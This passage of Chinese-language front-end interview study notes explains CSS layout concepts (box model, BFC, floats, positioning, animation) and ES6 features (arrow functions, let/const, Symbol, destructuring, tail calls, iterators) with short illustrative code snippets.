	   	E:first-child（一组兄弟元素中的第一个元素）
		E:last-child（一组兄弟元素中的最后一个元素）
		
		E:nth-child(2n) | E:nth-of-type(2n)：n 代表一个乘法因子, 0.1.2
		
		  a. nth-child: 数组中有所有子元素
		       父元素的 1.子元素 2.刚好处于指定位置
		     
		  b. nth-of-type: 即数组中只有指定子元素
		       选择的是某父元素第 n 的子元素，而且这个子元素是指定类型
		
	   (4) 全局属性
	   
		inherit：让一个不具备继承特性的属性可以继承父元素
		initial：重置某个属性为UA默认设置
		unset（区分是否为继承属性）：1.默认继承属性: 「inherit」   2.非继承属性: 「initial」

2. CSS优先级

	不同级别：总结排序：!important > 内联样式 > # > . > E > * > 继承 > 浏览器默认属性
	同一级别：后写的会覆盖先写的

 css选择器的解析原则：选择器定位DOM元素是从右往左的方向，这样可以尽早的过滤掉一些不必要的样式规则和元素（类似数学中的筛选法）
 
 3. 继承：子结点默认使用父结点的样式
     ├── 颜色、文字、字体间距、行高、水平对齐方式(text-align) 和列表的样式
     ├── visibility
     ├── cursor
    不可继承       
     ├── 垂直对齐方式(vertical-align)、盒子模型、布局
     
     
     (1) 文本 
     
     white-space: 用来控制空白字符的显示的「同时还能控制是否自动换行」
     
       nowrap: 忽略空白符，文本不换行「</br>除外」
       normal: 自动换行
       
       (1) 文本溢出显示为...
       
	       .ellipsis{
		    overflow: hidden;
		    text-overflow: ellipsis;
		    white-space: nowrap;
		}
     
    


 4. 规则：@import：告诉 CSS 引擎引入一个外部样式表（1.样式表头部声明 2.';'必须）
	 @media：如果满足媒介查询的条件，则规则生效
	 @font-face：设置嵌入 HTML 文档的字体
	 @keyframs：描述 CSS 动画的中间步骤
	 

二、css 盒模型：every element in web design is a rectangular box

    1. 
    
      box-sizing: 控制盒子模型的大小
      值：border-box | content-box

      (1)content-box（标准盒子模型）
      
           计算元素盒子大小时，需要加上padding和margin --- width 设置的是content-box 
      
           Element width = width + border + padding --- width 设置的是border-box 
	  
      (2)border-box（IE盒子模型）--- 应用于自适应与响应式布局
	   
	   计算元素盒子大小时，padding和margin已经被包含在内「元素高度包含 padding和 border」
	 
            Element width = width
    
    
     2. 一些有趣的事实
    
      (1) box-shadow：为盒子添加阴影
            想象下方设置了颜色的相同的盒子进行偏移
	  
         值：none「默认」 | [ , <shadow> ]*
	 
	 shadow：inset?「内阴影 」 && <length>{2,4} && <color>?
	 length：水平偏移 | 垂直偏移 | 模糊半径 | 阴影大小
	 
	 
      (2) outline：盒子轮廓（同 border）
      
          1. border 之外 2. 不占盒子空间
	  
       
      (3) overflow：容器宽高与内容的关系
     
           盒子肯定装不下内容呐!？所以我们可以设置 width | height
	 
           值：visiable「默认」 | hidden | clip  | scroll | auto「按需出现滚动条 」
	 
    
    
    2. width「默认：auto」 与 height「默认：auto」
    	width: auto
	  ├── 包含块宽度： <块级元素>
	  ├── 内容宽度： <行内元素>、float、position：absolute、inline-block、table
	  ├── 宽度溢出：inline-block; white-space: no-wrap

       height: auto「将具有灵活的高度，即其高度取决于子元素的高度」
      	  ├── 块级元素
	       ├─ 图片内联 height
	       ├─ containing box（line boxes 高度垂直堆叠）
	  ├── 行内元素
	       ├─ 非替换元素：line-height 
	       ├─ 替换元素：图片内联 height + padding | border | margin
   
   
    3. 百分比：绝大多数参照包含块宽高
    
        (1) 用单位明确指定包含块的高度
	
        (2) 另一种办法就是上面介绍的从html,body开始用百分比继承。「html的百分比是相对于浏览器而言」
	      html,body{height:100%} --- 子元素 div 可以使用百分比

 
       特殊：
        a. margin 和 padding:「包含块宽度」
	
	b. line-height:「自身font-size」
	
	c. vertical-align:「line-height」
	
	d. border-radius、transform: translate()：「自身宽高」
	
	    
	    
    5. margin
      (1) 负 margin「top 和 left 参考为外元素, right 和 bottom 参考为自身」
       
       宽度一定的 (position: static) 元素在 「top | left」 使用 负margin 的时候，作用就是将元素向这个方向移动
       在设置 「right | bottom」 时，并不会向右或向下移动，而是将后面的元素拉向自己，从而覆盖自己。
       
      (2) 水平居中：margin: auto
      
          原理：包含块的 width = 左m+左b+左p+width+右p+右b+右m
	       当 width 非 auto 时，可以通过 width 计算 margin「因为自身 width 与包含块相关」 
	       margin = (包含块width-(左b+左p+width+右p+右b))/2
	   
	 不能垂直居中原因也很简单：高度依赖的自身内容高度，是不能最初确定值的。「且mt、mb 的百分比值参照还是依赖包含块实际宽度的」
      
     
     (3) margin collapse「传统排版的段间距延续下来的」
          同一个 BFC 中的两个盒子同时具有相对方向的外边距时，其外边距还会发生叠加.
	  
	  解决：创建新的 BFC（外边距叠加是由 BFC 引起的，现要由 BFC 解决该问题，颇有以毒攻毒的味道。）
	  

		
四、normal flow 「display: 文档流布局」
	 定义：元素按照其在 html 中的位置顺序决定排布的过程
	 
	  (1) 这个过程包括了：
	     1) 块格式化( block formatting )，行内格式化( inline formatting )
	     2) 再进行相对定位( relative positioning )
	     
	  
	  (2)!!敲黑板：不要使用 hidden 全局属性，使用
	
		display：none => 改变页面布局 
		visibility：hidden => 不会触发绑定事件
		opacity=0 => 仍会触发事件



五、BFC：块级格式化上下文
	1. 定义：页面中的一块渲染区域，并且有一套渲染规则（明确地，它是一个独立的盒子，并且这个独立的盒子内部布局不受外界影响
	当然，BFC 也不会影响到外面的元素）
	
	    (1) 它决定了其子元素将如何定位。
  	    (2) 以及和其他元素的关系和相互作用。
	
	2. 成为 BFC 条件
	    根元素<html>
    	    float 属性不为 none
	    position 为 absolute 或 fixed
	    display 为 inline-block， table-cell， table-caption， flex， inline-flex
	    overflow「hidden」 不为 visible
	    
	  常见创建方式：overflow:hidden | float:left/right | position:absolute
	    
	3. BFC 布局规则
	    (1) BFC 这个元素的垂直方向的边距会发生重叠，垂直方向的距离由 margin 决定，取最大值
	    (2) BFC 的区域不会与浮动盒子重叠（清除浮动原理）
	    (3) 计算 BFC 的高度时，浮动元素也参与计算。



六、浮动「包裹性+破坏性」
	本质：文字环绕图片（浮动元素影响的不仅是自己，他会影响周围元素对其进行环绕）
	
	  1. float：注意，没有 trbl 等位置属性!!
	    (1) 包裹性
	      带有方向的 display: inline-block
	      
	    (2) 破坏性 
	      破坏了 inline-box [切断 line-box 链]
	      height = 0 [无inline box -> 无line box -> 无高度]
	  
	  2. 特点「很重要呐!」
	    a. 下一个兄弟元素会紧贴到该元素之前的「!!非浮动元素之后」
	    
	    
      2.为什么要清除浮动？（解决父元素高度坍陷问题）
	一个块级元素如果没有设置 height,其 height 由子元素撑开，对子元素使用了浮动之后，子元素就会脱离 normal flow
	也就是说，父及元素中没有内容可以撑开其高度，这样父级元素 height 就会被忽略。这就是所谓的高度坍塌
      
      3.如何清除浮动
	(1) 给父级元素定义高度 
	(2) 让父级元素也浮动 -- BFC
	(3) 父级定义 display:table -- table-layout计算
	(4) 父元素设置 overflow:hidden hasLayout（zoom：1）兼容IE6
	
	(5) clearfix:使用内容生成的方式清除浮动（不破坏 normal flow，没有副作用）
	
		.clearfix::after {
		  context: '.';
		  /* clear 合用于块级元素 */
		  display: block;
		  clear: both;
		  overflow: hidden;
		} 
		.clearfloat{zoom:1} /* 兼容 ie6、7 hasLayout(BFC) */


七、position「包裹性+破坏性」
    (1) 包裹性
	 带有位置的 display: inline-block
    
     z-index：一个HTML网页都可以看成是由一层一层页面元素堆叠起来的
     
     值：relative | static（默认值）| absolute | sticky | fixed
         
	
	1) relative：relative 移动后的元素在原来的位置仍占据空间 「normal flow 」
	
        2) absolute/fixed: 元素往 Z 轴方向上移了一层，元素脱离了「normal flow 」「注意：提升了 z-index」
	      
	  (2) 破坏性 
            (1) 脱离普通流的 display: inline-block
            (2) 定位祖先: 一定在同一包含块内「参照物为定位祖先（非 static）&& body 」
	    (3) 不再占据原来那层的空间，还会覆盖下层的元素。如果不想覆盖下层的元素，可以减少z-index的值以达到效果
	
	3) fixed：相对的是 viewport 「脱离 normal flow 」
	
	4) sticky：当元素在容器中被滚动超过指定的偏移值时，元素在容器内固定在指定位置 「normal flow 」
	  栗子：如果你设置了top: 50px，那么在 sticky 元素到达距离 relative 顶部 50px 的位置时固定，不再向上移动。
	  
	3. 蛋疼的属性 sticky
	  (1) 出现原因，也是因为监听 scroll 事件来实现粘性布局使浏览器进入慢滚动的模式
	  (2) 与浏览器想要通过硬件加速来提升滚动的体验是相悖的。
	  
	  
	  
八、变换、过渡和变化
      1. Transforms -- 变换
      
        transform 就是指的这个东西，拉伸，压缩，旋转，偏移
	
	  translate3d()：3d 位移「对应x轴、y轴、z轴的偏移」
	
	  rotate3d：3d 旋转「...旋转」
	
	  scale3d()：3d缩放「...缩放」

      2. Transition -- 过渡
      
	(1) transition-property「过渡属性」：emmm~字面意思
	    值：none「不指定」 | all「默认」「所有可过渡属性」 | 属性

	(2) transition-duration 「过渡时间」：time

	(3) transition-delay 「延迟过渡」：time

	(4) transition-timing-function 「动画类型」：规定速度效果的速度曲线，是针对每一个小动画所在时间范围的变换速率
	
	    值：ease | linear「线性」 | ease-in「慢到快」 | ease-out「快到慢」 | ease-in-out「慢快慢」 | 
	    [cubic-bezier()](https://cubic-bezier.com/#.17,.67,.83,.67)


        
      3. Animation -- 动画
      
        transition 和 animation 的区别
	  transition一般用来做过渡的, 
	   (1) 没时间轴的概念，
	   (2) 没中间状态(只有开始和结束2帧)「@keyframes」, 
	   (3) 通过事件触发(一次)「iteration-count：infinite」
	   
	  animate则是做动效,有时间轴的概念(帧可控),可以重复触发和有中间状态

		(1) @keyframes 「时间轴」：百分比
		比如这个动画的总时间是1s，那么10%就是在0-0.1s中的动画，通过这个我们可以较精确的控制动画变化中任何一个时间点的属性效果

		(2) duration 「过渡时间」：time

		(3) delay 「延迟过渡」：time

		(4) transition-timing-function 「动画类型」：规定速度效果的速度曲线，是针对每一个小动画所在时间范围的变换速率

		值：ease | linear「线性」 | ease-in「慢到快」 | ease-out「快到慢」 | ease-in-out「慢快慢」 | 
		   [cubic-bezier()](https://cubic-bezier.com/#.17,.67,.83,.67)

		(5) iteration-count 「播放次数」：具体次数 | infinite

		(6) direction 「播放方向」：：normal「时间轴顺序」 | reverse「时间轴反序」 | alternate「轮流」 | 
		    alternate-reverse「轮流(第一次先反向再正向)」

		(7) play-state 「播放状态」：running | paused

		(8) fill-mode 「结束后元素样式」：none「动画未开始前」 | forwards(动画结束后动画停留在结束状态) | 
		     backwords(动画回到第一帧的状态) | 
		     both(根据animation-direction轮流应用forwards和backwards规则)


	
十、对于行内元素，font-size指定 他们的content area的高度，由于inline box = 上下的helf-leading
		如果leading为0，在这种情况下，font-size指定了inline box的高度
		
		font-size 指的是字体的高度，但是不能指定每个字形给定字体高度下的实际高度，导致了span的高度大于line-height


十二、块元素和行内元素
	1.块元素会独占一行，默认情况下，其宽度自动填满父元素宽度 行元素不会占据一行，会一直排在一行，直到一行排不下
	2.行元素没有宽度和高度属性，块级元素即使设置了宽度，还是会独占一行
	块级元素： div  p forn ul li h1-h6
	行内元素：span img input a i
	

十三、如何画一个三角形：  设置宽高，然后用border去画
  			   width: 0;
        		   height: 0;
        		   border-bottom: 100px solid cyan;
        		   border-left: 50px solid transparent;
        		   border-right: 50px solid transparent;
			   

十四、伪类：link 表示链接正常情况下（即页面加载完成时）显示的颜色
	    hover:表示鼠标悬停时显示的颜色
	    visited:链接被点击时显示的位置
	    focus：元素获得光标焦点时的颜色
	    active: 元素处于激活状态
	link -> visited -> hover -> focus -> active
	

十五、雪碧图：多个图片集成在一个图片中的图
		使用雪碧图可以减少网络请求的次数，加快允许的速度「通过 background-position，去定位图片在屏幕的哪个位置」

		  1. background-position: 位置
		     值：percentage「图片百分比中心点与容器百分比中心点重合位置」「默认：0% 0%」
		        length
		        trbl

		    (1) background-origin: 参照物位置
		        值：border-box | padding-box（默认）| content-box

			
		  2. background-repeat: 平铺情况
		    值：repeat-x | repeat-y | [repeat | no-repeat「background-position 决定位置」 | css3 space「空白填补不被截断」 | css3 round「缩放不被截断」]{1,2} 
			一般都是由 padding-box 向四周平铺至 border-box，border-box 外才被裁剪
			
		    (1) background-clip: 向外裁剪区域
		        值：border-box | padding-box（默认）| content-box
		   
		   3. background-size：大小
		    
		 
		 
		 
		 
							es6面试
一、 箭头函数

    箭头函数表达式的语法比函数表达式更短，并且 不绑定自己的 this，arguments，super
    
        1.'()'： 不需要参数 / 需要多个参数
        2.'{}'： 代码块部分多于一条语句，且使用 `return` 语句返回
	
        3.箭头函数表达式的语法比函数表达式更短，并且不绑定自己的 this，arguments，super或 new.target
        4.这些函数表达式最适合用于非方法函数(non-method functions)「方法函数：作为对象属性的函数」
        5.不能用作构造函数(非 new)
	  ! Js 函数有两个内部方法：[[Call]] 和 [[Construct]]。
		    1)当通过 new 调用函数时，执行 [[Construct]] 方法 ---> new 的模拟实现。
		    2)当直接调用的时候，执行 [[Call]] 方法，直接执行函数体。
			箭头函数并没有 [[Construct]] 方法，不能被用作构造函数，如果通过 new 的方式调用，会报错。

	6.箭头函数的 this 指向「重点呐!」
	  箭头函数根本没有自己的this，所以需要通过查找作用域链来确定 this 的值。
		正是因为它没有this，所以也就不能用作构造函数。
		
	
二、let 和 const

    es5 只有全局和函数作用域（变量提升），栗子如下： --> 变量对象

	for (var i = 0; i < 10; i++) {
	    // 1. for 循环中计数变量泄漏为全局变量!
	}
	console.log(i); // 10 （2. for 循坏后仍可访问循坏中的变量）
	
    1. 为了加强对变量生命周期的控制，es6 新增了let、const。引入了块级作用域。函数内部 | 块中 '{ }' 之间的区域
    
        (1)不会被提升到作用域顶  (2)重复声明报错（es5 会替换同名属性哦！）  (3)不绑定全局作用域
	
	不绑定全局作用域栗子：
	let value = 1;
	console.log(window.value); // undefined
    
    2. let 与 const 的区别
        const 用于声明常量，其值「引用」一旦被设定不能再被修改（不允许修改绑定，但允许修改绑定对象），否则会报错。
	
		const data = { value: 1 }
		
		data.num = 3; // 没有问题
		data = {}; // Uncaught TypeError: Assignment to constant variable.
		
    3. 临时死区(Temporal Dead Zone)：因为let 和 const 声明的变量不会被提升，如果在声明之前访问这些变量，会导致报错
    
	原理：这是因为 Js 引擎在扫描代码发现变量声明时
	
		要么将它们提升到作用域顶部(遇到 var 声明)
		要么将声明放在 TDZ 中(遇到 let 和 const 声明)。访问 TDZ 中的变量会触发运行时错误。
		「只有执行过变量声明语句后!!」，变量才会从 TDZ 中移出，然后方可访问。
	
	栗子：看似很好理解，不保证你不犯错：
	
	var value = "global";
	(function() { // 变量对象有 value 变量，不会通过作用域链查找
	    console.log(value); // 并不会打印 "global"，而是报错 value is not defined，就是因为 TDZ 的缘故。

	    let value = 'local';
	}());
	

    4. let 循坏中的实现：
       底层实现：每次迭代循环时都创建一个新变量，并以之前迭代中同名变量的值将其初始化
    
    								// es6 let 底层实现伪代码
    	// es5							(let i = 0) {  
	for (let i = 0; i < 10; i++) {    			    funcs[0] = function() {
	    funcs[i] = function () {				        console.log(i)
		console.log(i);					    };
	    };							 }
	}

	// babel 编译后的 es6，通过闭包的方式实现
	var _loop = function _loop(i) {
	    funcs[i] = function () {
		console.log(i);
	    };
	};
	for (var i = 0; i < 10; i++) {
	    _loop(i);
	}



三：Symbol
   ES6 引入了一种新的 primitive（原始类型） Symbol，表示独一无二的值 

    1. 模拟实现 Symbol
       
        1) 通过 Symbol() 生成，不能使用 new
	
	
	2) String 作为参数, 表示对当前 Symbol 描述 [它的内部属性 [[Description]] 值为 descStr]
	    
	     var s1 = Symbol('foo'); // Symbol(foo)
	    
	    
	3) Symbol 不能与其他类型值进行运算
	     
	      var unique = Symbol();

	      var a = {
	          [unique]: 'Hello!'
	      };
	      
	
	4) 用于对象属性名，可以保证不会出现同名属性
	   ! 注意：我们实现的方式无法以对象字面量方式

	     * 无法被遍历：for..in、Object.keys()、Object.getOwnPropertyNames()、JSON.stringify() [emmmm~ 无法实现]
	     * Object.getOwnPropertySymbols
	   
	
	5) Symbol.for(str) [存在str名称返回，否则新建]
	6) Symbol.keyFor() [查找 symbol 的 key]


		(function (global) {
		    // [[Description]] 引擎实现属性，基本类型无法实现 [对象模拟]
		    // 工厂模式
		    function Symbol (desc) {

		    if (this instanceof  Symbol) throw new TypeError()

		    var symbol = Object.create({

			toString () { // 4. 不会出现同名属性 [×显示转为字符串]
			    // return 'Symbol(' + this.__Description__ + ')'; 对象作为属性名的时候，默认调用该 toString()
			    return this.__Name__
			},
			valueOf () { // 3. 不能和其他类型运算 [×无法显示 valueOf()]
			    throw new Error()
			}
		    })

		    var descStr = desc === undefined ? undefined : String(desc) // 2. Symbol 描述

		    function generateName(desc) { // 4. unique
		    var postfix = 0
			return function (desc) {
			postfix++
			return `@@${desc}_${postfix}`
			}
		    }

		    Object.defineProperties(symbol, {
			'__Description__': { // 属性特性默认为 false
			    value: descStr,
			},
			'__Name__': {
			    value: generateName(desc),
			}
		    })
		    return symbol // 返回一个新对象
		}

		    Symbol.forMap = {};

		    Object.defineProperties(Symbol, {
			'for': {
			    value: function(desc) {
				desc = desc === undefined ? undefined : String(desc)
				return forMap[desc] ? forMap[desc] : forMap[desc] = Symbol(desc);
			    },
			    writable: true,
			    configurable: true
			},
			'keyFor': {
			    value: function(symbol) {
				for (var key in forMap) {
				    if (forMap[key] === symbol) return key;
				}
			    },
			    writable: true,
			    configurable: true
			}
		    });
		})(this)






三：模板字符串：基础方法 ` `
        1. 空格、缩进、换行都会被保留
	2. 支持嵌入变量 | Js 表达式：'${}'
	3. 标签模板：模板字符串可以紧跟在一个函数名后面，该函数将被调用来处理这个模板字符串
	
 	    语法：function func(stringArr, val1, val2) => function func(stringArr, ...val)
		  
		  func`hi ${ a + b } xy ${ a * b }`; // 如果模板字符里面有变量,会将模板字符串先处理成多个参数，再调用函数
		  // 等同于
		  func(['hi ', '', ' xy ', ''], 15, 50); // 注意：stringArr 第二和第四个参数都是空字符串
    
    
四：扩展
    1. 对象的扩展
    
         (1) 省略属性名/方法简写
	 
	       * 省略的是属性名 [!重要 - 不是值]
	       * 值必须是变量
	       
	       --- 常与解构赋值一起使用
	    
	      	const baz = {
		     // 等于 method: function () {}
		     method (x, y) { 
		       return {x, y} // 等于 {x: x, y: y}
		     }
		}; 
		baz.method(1, 2) // return {x: 1, y: 2}
		
		应用：在Vue中都是在vm对象中书写方法，完全可以使用方法简写的方式书写函数
		
		
	 (2) 表达式作为属性名 [字面量对象]
	 
		  mutations: {
		    [SOME_MUTATION] (state) {
		      // mutate state
		    }
		  }
		
    
     2. 数组的扩展
     	... 运算符：原理和 for..of 一样，遍历 Iterator 接口的对象
	
	[...arr, last] // 语法错误, 因为会遍历至结束，所以只能放在数组解构赋值的最后一个参数
	  
     
          (1) 函数调用
	      作用：将一个实现了 Iterator 接口的对象转为用逗号分隔的「参数序列!」
	  
	       简化数组操作：转为 []「数组字面量构造函数」的参数
	       
	           (1) 简化 arr.slice() 
		       => [...arr]
		       
		   (2) 代替 apply 方法   
		       => Math.max.apply(null, [14, 3, 77]) => Math.max(...[14, 3, 77])
		       
		   (3) 数组去重   
		       => function unique(arr) => [...new Set(arr)]
		   
	  (2) 函数声明
	      变量获取函数的多余参数
	      
	      1) 访问函数的arguments对象是一个很昂贵的操作, es6 不推荐使用 arguments 
	      
	      2) 严格模式禁用
	      	  * arguments.callee 
		    --> var method = funcion name () {} [命名函数表达式]
		    
		  * arguments.caller
		  
	      3) 箭头函数没有 arguments, 必须使用剩余运算符访问参数集合
	      
	      栗子：
	      	   	// rest 变量用于获取函数的多余参数
	      		function foo(...rest) {
			  console.log(rest) // [1,2,3]
			}
			foo(1,2,3)
			

	      
				   
		   
     3. 函数的扩展
     
	      1) 函数参数默认值
	      
     	            var call2 = function (context) {
		         context = context || window // es5 变通实现
		    }
		     
		    var call2 = function (context = window) {
		        // 不能用 let、const 再次声明 context
		    } 
		     
		      1. 每次调用都重新计算表达式
		      2. 惰性求值
		      3. 尾参数 [否则无法省略该参数]
		      
		          栗子： function foo({x=5, y}) {}
		      
		      4. 失真的 length 属性
		      
		         * 含义：该函数预期传入的参数值 [含义]		      
		         * length = 函数参数 - 参数默认值

			demo：
			
			    (function (x, y, z = 5) {}).length // 2
			    
		      5. 单独作用域
		         函数进行声明初始化时，参数会形成一个单独的作用域（context），等到初始化结束，作用域就会消失
			
				let x = 1;
				function f(y = x) { // 在单独作用域内 x 未定义，通过作用域链查找
				  let x = 2;
				  console.log(y);
				}
				f() // 1

				var x = 1;

				function f(x, y = x) { // 单独作用域内指向第一个参数 x
				  console.log(y);
				}
				f(2) // 2
			     
			     
		         * !重要：尾调用 [函数最后一步是调用另一个函数]
			 
			 
			      1) 两者又有什么区别呢？答案就是执行上下文栈的变化不一样。
			 
		             栗子：
			     
			        /**
				 * 不一定出现在函数尾部，只要是最后一步操作即可
				 *
				 * 1. 代码在执行时，会被压入一个执行上下文栈，当执行完之后就会出栈
				 *    Arguments 对象 -- 执行上下文相关数据作用域
				 * 
				 * 2. 尾调用是函数的最后一步，所以不需要保留外层函数的执行上下文，
				 *    因为调用位置（arguments.callee）、内部变量等信息都不会再用到了, 它内部的一切计算都已经完成了
				 * 
				 * 3. 此时它在栈内的唯一作用就是记录最后结果应该返回到哪一行, 只要直接外层函数调用位置
				 *    赋值给内层函数的调用位置，然后用内层函数执行上下文取代外层函数执行上下文即可
				 */
			 	  function f(x) {
				      return g(x);
				  }
				  
				  
				  // 非尾调用: 因为 g(x) 的返回值还需要跟 1 进行计算后，f(x) 才会返回值
				  // 1. 保存内部变量  2. 保存调用位置
				  function f(x){
				      return g(x) + 1;
				  }
				  
				// 伪代码
				ECStack.push(<f> fContext);
				ECStack.pop();
				ECStack.push(<g> fContext);
				ECStack.pop();
				
				我们再来模拟一下第二个非尾调用函数执行时的执行上下文栈变化：
				ECStack.push(<f> fContext);
				ECStack.push(<g> fContext);
				ECStack.pop();
				ECStack.pop();
				
				重要：JavaScript 引擎对于代码执行栈的长度是有限制的，超过会爆栈。
			
			
			      2) !重要 -- 在严格模式下开启
			            正常模式下尾递归失效
			      
			           尾递归发生时，函数的执行上下文栈会改写，所以下述变量为失真
			           
		        	     * f.arguments
		        	     * f.arguments.caller
				     
				     
			      3) 尾调用
				        // 手动替换函数执行上下文
					var loop = function (f) {
					    while (f && f instanceof Function) {
						f = f()
					    }
					    return f
					}
					/**
					 * 1. 返回一个函数，再手动调用该函数 [不是函数里面调用函数]
					 * 2. 尾调用内层执行上下文取代外层上下文
					 */
					function sum(x, y) {
					    if (y > 0) {
						return sum.bind(null, x+1, y-1)
					    } else {
						return x
					    }
					}
			
			
		             栗子：阶乘函数优化
			     
				function factorial(n) {
				    if (n == 1) return n;
				    return n * factorial(n - 1) // 1 * 2 * 3 * 4 = 24
				}


				function factorial(n, res) {
				    if (n == 1) return res;
				    return factorial(n - 1, n * res) // 4 * 3 * 2 * 1 = 24
				}
				
				// 继续优化为偏函数的 demo
				var newFactorial = partial(factorial, _, 1)

				newFactorial(4) // 24
				
				
		             栗子：真正的尾递归优化
			         
				 !重要，tco 只会执行一次，通过闭包实现循坏初始化
				
				/**
				 * tco函数： [初始化闭包][sum == acc函数]
				 * 
				 *   * sum 实现参数传递
				 *   * active状态机 终止递归调用
				 * 
				 * acc函数状态机实现循环调用 sum
				 * 
				 *   * 递归调用 acc函数 [arguments] 更新递归参数
				 *   * (!active) => 在递归调用时返回 undefined
				 *   * while => 实现循坏
				 */
				function tco(f) {
				    var value;
				    var active = false;
				    var accumulated = []; // 闭包
				    
				    // core
				    return function acc() {
					accumulated.push(arguments);
					if (!active) {
					    active = true;
					    while (accumulated.length) {
						value = f.apply(this, accumulated.shift());
					    }
					    active = false;
					    return value; // @return undefined
					}
				    };
				}

				var sum = tco(function (x, y) {
				    if (y > 0) {
					return sum(x + 1, y - 1) // 闭包实现参数更新
				    }
				    else {
					return x
				    }
				});



		     
	      2) 严格模式
	         在函数内部不能显示指定为严格模式
		 
		      * 函数默认值, 解构赋值, 扩展运算符× 
		 
		      原因：函数内部严格模式，同样适用于函数参数和函数体，如果对他们应用的话，参数 [默认值, 解构赋值, 扩展运算符] 是先于
		      函数体执行的，违背逻辑
		      
		           
		    
	      
	      
		
     4. class： class 只是语法糖，绝大部分功能 es5 就可以做到，新的 class 只是让对象原型的写法更清晰、更像面向对象而已
        注意：class内部 定义的所有方法，都是不可枚举的（non-enumerable）。
	
          (1) constructor：「constructor内」定义的属性是对象自己的，「constructor外」定义的是原型方法与属性。
	  (2) static：class 本身的属性与方法，而不是定义在实例上的。
	     es5:   
		class Person {}
	        Person.name = 'kevin';
	     
	     es6:        
		class Person {
		  static name = 'kevin';
		} 
	
	  (3) 只能通过 new 调用
	  
	  babel 编译：
	      a. 先通过 instanceof 检查是否通过 new 调用，否则 throw new TypeError，constructor 编译为与 构造函数相同的代码
	      b. 调用_createClass() ，Object.defineProperty 挂载静态与原型方法
	      	    
		  var _createClass = function() {
		    function defineProperties(target, props) {
		    	 
			/*props: 原型「静态」方法数组*/ 
		        for (var i = 0; i < props.length; i++) {
			
			    // ...遍历数组，配置属性描述符(enumerable: false)
			    
			    Object.defineProperty(target, props[i].key, descriptor);
		        }
		    }
		    return function(Constructor, proto, static) {
		        if (proto) defineProperties(Constructor.prototype, proto);
		        if (static) defineProperties(Constructor, static);
		        return Constructor;
		    };
		  }();
		    
		    
	            _createClass(Person, [{ // 原型方法数组对象
			key: 'sayHello',
			value: function sayHello() {
			    return 'hello, I am ' + this.name;
			}
		    }], 
		    [{ // 静态方法数组对象
			key: 'onlySayHello',
			value: function onlySayHello() {
			    return 'hello';
			}
		    }]);
		
		c. 返回的构造方法上 Person.static = 'a' // 挂载静态属性
		
	    
	    (4) extends：实现继承  ---> 寄生组合式继承
	       a. 两条继承链 Child._proto_ = Parent（不再指向 Function）
	       
	       b. super：
	          1. 表示父类构造函数，相当于 Parent.call(this) --- 借用构造函数
	          
		  2. 只能用在对象方法中，指向当前对象的原型对象
	 	
		  super.f === Object.getPrototypeOf(this).f == this._proto_.f
		  
		  
	    继承实现：
	       
	       class Child extends Parent {
	            constructor(name, age) {
			super(name) // 子类没有自己的this对象，必须调用父类的 constructor(name)
			this.age = age;
		    }
		} 
	       
			
	 
	 5. 解构赋值
	    原理：解构是ES6的语法糖，其实内在是针对可迭代对象的 Iterator 接口，通过遍历器按顺序获取对应的值进行赋值
	    
	       * 数组：数组进行迭代 [next() 对象 value 属性赋值给对应变量]
	       * 对象：会被当做 Map 进行解构
	       
	       * 场景：连续赋值声明的变量可以采用数组解构
	       
	          => 重要!!解构赋值可以声明连续的变量 var [x, y] = [1, 2] // x, y 变量都被声明
	       
	 
	 (1) 数组
	    
	      1) 交换变量： [a, b] = [b, a] // 避免声明了 tmp 存储值
		
		
	 (2) 对象 [属性是模式匹配，解构是赋值变量]
	     
	        * 先去找到匹配的属性值
	        * 再进行变量赋值
	    
	      1) 对象解构，
	           
		   a. demo 如下：
	         
			function bar() {
			    return {
				      x: 1,
				      y: 2,
				   };
			 }
			var { x, y } = bar(); // x==1, y==2

			var { x: a, y: b }=bar() // a==1, b==2
			
			
		   b. 包括原型属性
		   
			var { toString } = {}; 
			// toString === Object.prototype.toString) => true

	      
	      
	      2) 转移对象的方法
	      
	         * 函数执行
		 
			getUserInfo (obj) // 执行
	      
	         * 函数声明
		 
			async getUserInfo (
				ctx, // 第一个参数是对象，可以随意命名 [name]
			) {
				let res = await getUser();
				ctx.commit(GET_USERINFO, res) // name.commit 调用 commit 函数
			},

			async getUserInfo ({
				commit, // 解构到对象的 commit 方法
			}) {
				let res = await getUser();
				commit(GET_USERINFO, res) // 对象解构
			},

	    
	 
	 6. iterator
	    [解构赋值，剩余/扩展运算符、generator、forOf]
	 
	    es6 需要统一的接口机制，处理不同的数据结构，表示集合的数据结构从数组、对象又扩展了 Map、Set
	    
	 
	      (1) 迭代器模式 
	      
	          * 设计模式 [为各种不一样的数据解构提供统一的访问机制]
		  
		      var iterator = createIterator([1,2,3]); // 迭代器对象
		  
	          * ES6 for..of 相当于迭代器 [遍历数据结构时，自动寻找Iterator接口]
		
		
	      (2) 可迭代对象
	   
	          1)  !重点：不是内置对象或语法，仅仅是协议
	             
	                * 可迭代协议：Symbol.iterator [返回迭代器协议]
	                * 迭代器协议：必须实现 1. next()方法  2. return {done, value}
	     
	          2) 对于任何 key 非线性的数据结构，部署遍历器接口，就等于部署一种线性转换，所以 obj 没有部署
	   
	   
	      (3) forOf: 通过迭代器对象遍历数据结构
	   
	          1) [Symbol.iterator] 属性
	   
		 	var iterator = createIterator([1, 2, 3]);

			// TypeError: iterator is not iterable
			for (let item of iterator) { 
			    console.log(item);
			}
		
		修改为：
		       arr[Symbol.iterator] = createIterator([1, 2, 3])
		       
		       for (let item of arr) { 
		           // forOf 获取的是 obj[Symbol.iterator]() 执行后的对象
		       }
		       

		
  	   2) 默认可遍历对象
	   
	   	数组、类数组对象、Set、Map、Generator对象、字符串「包装对象」
		
	      babel 编译：
	      	自己写 createIterator 函数，那么 next 方法是必须部署的，return 方法和 throw 方法是否部署是可选的
	        总之如果在浏览器中实现的话，return 返回值没有用..
	      
	        	var colors = new Set(["red", "green", "blue"]);

			var _complete = true; // 是否完成一次完整的迭代
			var _isError = false; // 迭代过程是否出错
			var _error = undefined; // 详细错误

			try {
			    for (
				/*
				1. _complete = next().dont [迭代完成?]
				2. _step = next() [迭代对象]
				 */
				var _iterator = colors[Symbol.iterator](), _step;
				!(_complete = (_step = _iterator.next()).done);
				_complete = true // 没有用..
			    ) {
				var color = _step.value;
				/*
				  if (color == 1) break; [循环提前退出「出错、break、continue」，就会调用 return 方法]
				  Generator 规范决定 return 方法必须返回一个对象
				 */

				cb(color); // forOf cb()
			    }
			} catch (err) {
			    _isError = true;
			    _error = err;
			} finally {
			    try {
				// _iterator 未迭代完成, 判断有无 _iterator.return，有就调用
				if (!_complete && _iterator.return) {
